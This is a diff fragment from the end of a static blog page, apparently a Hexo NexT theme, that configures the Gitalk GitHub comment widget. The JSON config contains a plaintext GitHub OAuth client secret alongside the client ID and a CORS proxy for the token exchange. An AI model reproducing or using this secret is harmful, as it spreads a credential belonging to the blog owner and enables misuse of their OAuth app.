+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"koun9hwan","repo":"blog-comments","client_id":"5ccab05e870b0e138ca8","client_secret":"3592ccc63d9364524a0a6ce592a5ffb9b1f6c867","admin_user":"koun9hwan","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"7383167878ffd4d4099738209f646681"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
